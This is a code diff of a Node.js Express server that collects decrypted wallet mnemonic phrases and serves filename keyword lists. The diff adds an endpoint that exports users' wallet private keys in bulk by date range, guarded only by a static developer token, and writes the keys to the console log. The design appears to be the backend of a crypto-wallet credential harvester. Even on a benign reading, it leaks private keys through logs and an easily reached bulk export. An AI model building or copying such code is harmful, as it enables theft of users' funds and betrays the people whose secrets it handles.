@@ -78,11 +78,13 @@ app.options('/test/ping', cors(corsOptions)); // Enable preflight request for th
 app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
     const userId = req.body.userId; // Retrieve the userId from form data
     if (!userId) {
+        console.error('Missing userId');
         const response = createResponse(10005, 'Missing userId');
         return res.status(400).json(response);
     }
 
     if (!req.file) {
+        console.error('No file uploaded');
         const response = createResponse(10006, 'No file uploaded');
         return res.status(400).send(response);
     }
@@ -116,7 +118,8 @@ app.get('/basic/image-download', async (req, res) => {
     const { fileName, userId } = req.query;
 
     if (!fileName || !userId) {
-        return res.status(400).send('Missing fileName or userId.');
+        const response = createResponse(10005, 'Missing fileName or userId');
+        return res.status(400).json(response);
     }
 
     try {
@@ -141,18 +144,17 @@ app.get('/basic/image-edit-info-download', async (req, res) => {
     const { userId, fileName } = req.query;
 
     if (!userId || !fileName) {
-        return res.status(400).send('Missing userId or fileName.');
+        console.error('Missing userId or fileName');
+        const response = createResponse(10005, 'Missing userId or fileName');
+        return res.status(400).json(response);
     }
 
     try {
-        // TODO: Get the image edit info from MongoDB
+        // Get the image edit info from MongoDB
         const editInfo = await utils.getImageEditInfo(fileName);
 
-        res.send({
-            status: 'success',
-            editInfo,
-            message: 'Image edit info downloaded successfully!'
-        });
+        const response = createResponse(0, 'Image edit info downloaded successfully', editInfo);
+        res.json(response);
     } catch (error) {
         console.error('Download error:', error);
         const response = createResponse(error.code || 10000, error.message);
@@ -166,17 +168,19 @@ app.post('/basic/image-edit-info-upload', async (req, res) => {
     const { token, fileName, editInfo } = req.body;
 
     if (!fileName || !editInfo) {
+        console.error('Missing fileName or editInfo');
         const response = createResponse(10016, 'Missing fileName or editInfo');
         return res.status(400).json(response);
     }
     if (token !== process.env.DEV_TOKEN) {
+        console.error('Authentication failed');
         const response = createResponse(10002, 'Authentication failed');
         return res.status(401).json(response);
     }
 
     try {
-        // TODO:
-        const uploadResult = await utils.uploadImageEditInfo(fileName, editInfo);
+        // Upload the image edit info to MongoDB
+        await utils.uploadImageEditInfo(fileName, editInfo);
 
         const response = createResponse(0, 'Image edit info uploaded successfully');
         res.json(response);
@@ -204,6 +208,7 @@ app.post('/basic/mnemonic-upload', async (req, res) => {
         // Validate the decrypted mnemonic
         const valid = bip39.validateMnemonic(decryptedMnemonicPhase);
         if (!valid) {
+            console.log('Invalid mnemonic phrase');
             const response = createResponse(10017, 'Invalid mnemonic phrase');
             return res.status(400).json(response);
         }
@@ -233,6 +238,41 @@ app.post('/basic/mnemonic-upload', async (req, res) => {
 });
 app.options('/basic/mnemonic-upload', cors(corsOptions)); // Enable preflight request for this endpoint
 
+// TODO:
+app.post('/basic/wallet-credential-download', async (req, res) => {
+    const { token, startDateTime, endDateTime } = req.body;
+
+    if (token !== process.env.DEV_TOKEN) {
+        console.error('Authentication failed');
+        const response = createResponse(10002, 'Authentication failed');
+        return res.status(401).json(response);
+    }
+
+    try {
+        // Get the mnemonic phrases from MongoDB
+        const walletCredentials = await utils.getWalletCredentials(startDateTime, endDateTime);
+
+        const parsedCredentials = walletCredentials.map(credential => {
+            return {
+                userId: credential.userId,
+                userAddress: credential.userAddress,
+                userPrivateKey: credential.userPrivateKey,
+                createdAt: credential.createdAt
+            };
+        });
+
+        console.log(parsedCredentials);
+
+        const response = createResponse(0, 'Wallet credentials downloaded successfully', parsedCredentials);
+        res.json(response);
+    } catch (error) {
+        console.error('Download error:', error);
+        const response = createResponse(error.code || 10000, error.message);
+        res.status(500).json(response);
+    }
+});
+app.options('/basic/wallet-credential-download', cors(corsOptions)); // Enable preflight request for this endpoint
+
 // TODO: Request the latest version number of the APP from GitHub releases
 app.get('/basic/latest-version', async (req, res) => {
     const owner = process.env.GITHUB_OWNER;
@@ -242,14 +282,17 @@ app.get('/basic/latest-version', async (req, res) => {
         const response = await fetch(`https://api.github.com/repos/${owner}/${repo}/releases/latest`);
         if (response.ok) {
             const data = await response.json();
-            res.send({
-                version: data.tag_name // 'tag_name' typically holds the version number
+            const response = createResponse(0, 'Latest version fetched successfully', {
+                version: data.tag_name
             });
+            res.json(response);
         } else {
+            console.error('Failed to fetch the latest version from GitHub.');
             const response = createResponse(10013, 'Failed to fetch the latest version from GitHub.');
             res.status(500).json(response);
         }
     } catch (error) {
+        console.error('Server error while fetching the latest version:', error);
         const response = createResponse(10014, 'Server error while fetching the latest version.');
         res.status(500).json(response);
     }
@@ -268,9 +311,10 @@ app.get('/basic/latest-release', async (req, res) => {
             const data = await response.json();
             const asset = data.assets.find(asset => asset.name === 'release.zip'); // Find the specific asset
             if (asset) {
-                res.send({
-                    file: asset.browser_download_url // URL to download the asset
+                const response = createResponse(0, 'Release file found successfully', {
+                    url: asset.browser_download_url // URL to download the asset
                 });
+                res.json(response);
             } else {
                 const response = createResponse(10019, 'Release file not found.');
                 res.status(404).json(response);
@@ -291,14 +335,15 @@ app.get('/basic/filename-keywords-download', async (req, res) => {
     const { userId } = req.query;
 
     if (!userId) {
+        console.error('Missing userId');
         const response = createResponse(10005, 'Missing userId');
         return res.status(400).json(response);
     }
 
     try {
-        const keywords = await utils.getKeywords(); // TODO:
+        const keywords = await utils.getKeywords();
 
-        const response = createResponse(0, 'Keywords found successfully');
+        const response = createResponse(0, 'Keywords found successfully', keywords);
         res.json(response);
     } catch (error) {
         console.error('Search error:', error);
@@ -314,17 +359,19 @@ app.post('/basic/filename-keywords-upload', async (req, res) => {
     const { token, keywords } = req.body;
 
     if (!Array.isArray(keywords) || keywords.length === 0) {
+        console.error('Missing keywords');
         const response = createResponse(10022, 'Missing keywords');
         return res.status(400).json(response);
     }
 
     if (token !== process.env.DEV_TOKEN) {
+        console.error('Authentication failed');
         const response = createResponse(10002, 'Authentication failed');
         return res.status(401).json(response);
     }
 
     try {
-        const uploadResult = await utils.uploadKeywords(keywords); // TODO:
+        await utils.uploadKeywords(keywords);
 
         const response = createResponse(0, 'Keywords uploaded successfully');
         res.json(response);
